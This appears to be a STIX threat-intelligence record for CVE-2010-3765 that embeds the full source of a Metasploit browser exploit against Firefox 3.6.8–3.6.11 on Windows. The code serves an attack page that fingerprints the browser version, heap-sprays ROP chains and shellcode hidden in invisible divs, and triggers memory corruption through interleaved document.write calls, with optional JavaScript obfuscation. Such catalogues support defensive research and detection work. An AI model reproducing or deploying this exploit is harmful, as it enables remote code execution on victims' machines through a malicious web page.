{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f3d3cad5-74aa-4845-bfc0-aa7d42b2ee35",
    "created": "2024-08-14T16:44:16.675727Z",
    "modified": "2024-08-14T16:44:16.675731Z",
    "name": "Mozilla Firefox Interleaved document.write/appendChild Memory Corruption",
    "description": " This module exploits a code execution vulnerability in Mozilla Firefox caused by interleaved calls to document.write and appendChild. This module was written based on a live exploit found in the wild.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/mozilla_interleaved_write.rb",
            "external_id": "mozilla_interleaved_write.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3765"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=607222"
        },
        {
            "source_name": "reference",
            "url": "http://www.mozilla.org/security/announce/2010/mfsa2010-73.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name => HttpClients::FF,\n  #  :ua_minver => \"3.6.8\",\n  #  :ua_maxver => \"3.6.11\",\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :javascript => true,\n  #  :rank => NormalRanking,\n  #  :vuln_test => \"if (typeof InstallVersion != 'undefined') { is_vuln = true; }\",\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mozilla Firefox Interleaved document.write/appendChild Memory Corruption',\n      'Description'    => %q{\n          This module exploits a code execution vulnerability in Mozilla\n        Firefox caused by interleaved calls to document.write and appendChild.\n        This module was written based on a live exploit found in the wild.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'unknown',        # discovered in the wild\n          'scriptjunkie'    # Metasploit module, functionality/portability fixes\n        ],\n      'References'     =>\n        [\n          ['CVE',    '2010-3765'],\n          ['OSVDB',  '68905'],\n          ['BID',    '15352'],\n          ['EDB',    '15352'],\n          ['URL',    'https://bugzilla.mozilla.org/show_bug.cgi?id=607222'],\n          ['URL',    'http://www.mozilla.org/security/announce/2010/mfsa2010-73.html']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\",\n        },\n      'Platform'      => %w{ win },\n      'Targets'        =>\n        [\n          # Tested against Firefox 3.6.8, 3.6.9, 3.6.10, and 3.6.11 on WinXP and Windows Server 2003\n          [ 'Firefox 3.6.8 - 3.6.11, Windows XP/Windows Server 2003',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-10-25'\n      ))\n\n      register_options(\n        [\n          OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', true])\n        ]\n      )\n  end\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending exploit HTML...\")\n    send_response_html(cli, generate_html(p), { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\n\n  def generate_html(payload)\n    enc_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    custom_js = %Q|\nfunction check(){\n  var temp=\"\";\n  var user=navigator.userAgent.toLowerCase();\n  var vara=user.indexOf(\"windows nt 6.1\");\n  var varb=user.indexOf(\"windows nt 6.0\");\n  var varc=user.indexOf(\"firefox/3.6.8\");\n  var vard=user.indexOf(\"firefox/3.6.9\");\n  var vare=user.indexOf(\"firefox/3.6.10\");\n  var varf=user.indexOf(\"firefox/3.6.11\");\n  if(vara==-1&&varb==-1&&varc!=-1&&vard==-1&&vare==-1&&varf==-1){\n    temp=\"8\";\n  }\n  else if(vara==-1&&varb==-1&&varc==-1&&vard!=-1&&vare==-1&&varf==-1){\n    temp=\"9\";\n  }\n  else if(vara==-1&&varb==-1&&varc==-1&&vard==-1&&vare!=-1&&varf==-1){\n    temp=\"10\";\n  }\n  else if(vara==-1&&varb==-1&&varc==-1&&vard==-1&&vare==-1&&varf!=-1){\n    temp=\"11\";\n  }\n  else {\n    return temp=\"0\";\n  }\n  return temp;\n\n}\nfunction dedede(argsu){\n  var i;var sunb = \"\";\n  for (i = 0; i < argsu.length; i++){\n    sunb += String.fromCharCode(parseInt(argsu[i], 16));\n    }\n  return unescape(sunb);\n}\nfunction code(beastk){\n  var nop = \"\";\n  var len = beastk.length;\n  for (i = 0; i < len;) {\n    nop = nop + \"m\" + beastk.substring(i, i + 5);\n    i = i + 5;\n  }\n  nop = nop.split(\"m\").toString();\n  var temp = new Array();\n  for (j = 0; j < nop.length; j++) {\n    if (nop.charCodeAt(j).toString(16) == \"2c\") {\n      temp.push(\"25\");\n    }\n    else {\n      temp.push(nop.charCodeAt(j).toString(16));\n    }\n  }\n  return dedede(temp);\n}\nfunction getatts(str){\n  var cobj=document.createElement(str);\n  cobj.id=\"testcase\";\n  document.body.appendChild(cobj);\n  var obj=document.getElementById(\"testcase\");\n  var atts = new Array();\n  for(p in obj){\n    if(typeof(obj[p])==\"string\"){\n      atts.push(p);\n    }\n  }\n  document.body.removeChild(cobj);\n  return atts;\n}\nvar chk=check();\nvar bk=\"mp.ojsyex5\";\nvar array = new Array();\nvar ls = 0x100000-(bk.length*2+0x01020);\nvar retaddr =\"\";//////////////////////111111111111111111111111111111\nif (chk == \"0\") {\n  location.href = \"about:blank\";\n}\nelse {\n\n    if(chk==\"8\"){\n      retaddr=code(\"u0d0du0d0d\");\n      }\n    if(chk==\"9\"){\n      retaddr=code(\"uef52u100a\");\n      }\n    if(chk==\"10\"){\n      retaddr=code(\"ub8b7u1029\");\n      }\n    if(chk==\"11\"){\n      retaddr=code(\"u4bc8u1000\");\n    }\n\n  var ropstr = retaddr;\n  while (ropstr.length < (0x85750 - 0x1000) / 2) {\n    ropstr += retaddr\n  };\n\n  ///////////////////////////////2222222222222222222\n  var sunb=\"\";\n  var sun8inner = document.getElementById(\"sun8\").innerHTML;\n  var sun9inner = document.getElementById(\"sun9\").innerHTML;\n  var sun10inner = document.getElementById(\"sun10\").innerHTML;\n  var sun11inner = document.getElementById(\"sun11\").innerHTML;\n  var shellcodes = document.getElementById(\"suv\").innerHTML;\n  if(chk==\"8\"){\n      sunb=sun8inner;\n      }\n  if(chk==\"9\"){\n      sunb=sun9inner;\n      }\n  if(chk==\"10\"){\n      sunb=sun10inner;\n      }\n  if(chk==\"11\"){\n      sunb=sun11inner;\n      }\n  ropstr += code(sunb + shellcodes);\n  for (u = 0; u < 8; u++) {\n    retaddr += retaddr;\n  }\n  while (ropstr.length < ls) {\n    ropstr += retaddr;\n  }\n  var lefthalf = ropstr.substring(0, ls / 2);\n  ropstr = \"\";\n  for (i = 0; i < 0x200; i++) {\n    array[i] = lefthalf + bk;\n  }\n  ////////////////////////////////////333333333333\n  if(chk==\"8\"){\n    retaddr=code(\"ub8a7u1029\");\n  }\n  if(chk==\"9\"){\n    retaddr=code(\"uab07u1006\");\n  }\n  if(chk==\"10\"){\n    retaddr=code(\"u8247u1009\");\n  }\n  if(chk==\"11\"){\n    retaddr=code(\"uf7e7u1017\");\n  }\n  for (i = 0; i < 16; i++) {\n    retaddr += retaddr;\n  }\n  ropstr = retaddr;\n  while (ropstr.length < ls) {\n    ropstr += retaddr;\n  }\n  lefthalf = ropstr.substring(0, ls / 2);\n  ropstr = \"\";\n  for (i = 0x200; i < 0x500; i++) {\n    array[i] = lefthalf + bk;\n  }\n\n  var tags = new Array(\"audio\", \"a\", \"base\");\n  for (inx = 0; inx < 0x8964; inx++)\n    for (i = 0; i < tags.length; i++) {\n      var atts = getatts(tags[i]);\n      for (j = 0; j < atts.length; j++) {\n        var html = \"<\" + tags[i] + \" \" + atts[j] + \"=a></\" + tags[i] + \">\" + tags[i];\n        document.write(html);\n      }\n    }\n}\n    |\n\n      if datastore['OBFUSCATE']\n        opts = {\n          'Symbols' => {\n            'Variables' => %w{ atts temp vara varb varc vard vare varf argsu beastk nop tags retaddr\n              ropstr lefthalf bk sunb shellcodes sun8inner sun9inner sun10inner sun11inner array chk },\n            'Methods'   => %w{ getatts code check dedede }\n          }\n        }\n\n        custom_js = ::Rex::Exploitation::ObfuscateJS.new(custom_js, opts).obfuscate(memory_sensitive: true)\n      end\n\n    return <<-EOS\n<html>\n<body>\n<div style=\"visibility:hidden;width:0px;height:0px\">\n<div id=sun8>ub8acu1029u0d00u0d0du0d00u102du1000u0d00u102du1000u8710u1018ub288u1086u127cu1004udc24u1009u102du1000u0000u0000u1000u0000u1000u0000u0040u0000u1af1u1000u9090u0febu7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000u5b58u1889u7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000ufb83u74ffu7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000u830bu04c0u7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000uf3ebue890u7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000uffecuffffu7be4u1005u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004udc24u1009</div>\n<div id=sun9>u2794u1000uc288u1082u3e38u1000u6cd4u100bu1016u1000u0000u0000u1000u0000u1000u0000u0040u0000uce22u1003u9090u0FEBu9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003u5B58u1889u9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003uFB83u74FFu9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003u830Bu04C0u9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003uF3EBuE890u9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003uFFECuFFFFu9602u1001u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u6cd4u100b</div>\n<div id=sun10>uB8B7u1029uB8B7u1029uB8B7u1029uB8B7u1029uB8B7u1029uB8B7u1029u20F0u1011u2288u1082u428au1000u7676u1016ub8b7u1029u0000u0000u1000u0000u1000u0000u0040u0000u9405u1003u9090u0FEBuE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003u5B58u1889uE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003uFB83u74FFuE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003u830Bu04C0uE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003uF3EBuE890uE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003uFFECuFFFFuE541u1001u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u7676u1016</div>\n<div id=sun11>u4bc8u1000u4bc8u1000u4bc8u1000u4bc8u1000u4bc8u1000u4bc8u1000u83cau1000u0280u1083u3b5au1000u8ef4u100au4bc8u1000u0000u0000u1000u0000u1000u0000u0040u0000u11a1u1000u9090u0FEBu3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000u5B58u1889u3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000uFB83u74FFu3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000u830Bu04C0u3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000uF3EBuE890u3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000uFFECuFFFFu3500u1007u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u8ef4u100a</div>\n<div id=suv>#{enc_code.split(\"%\").join}uffffuffffuffffuffff</div>\n</div>\n<body>\n<script type=\"text/javascript\">\n#{custom_js}\n</script></body></html>\nEOS\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-25",
    "x_mitre_platforms": [
        "win'"
    ]
}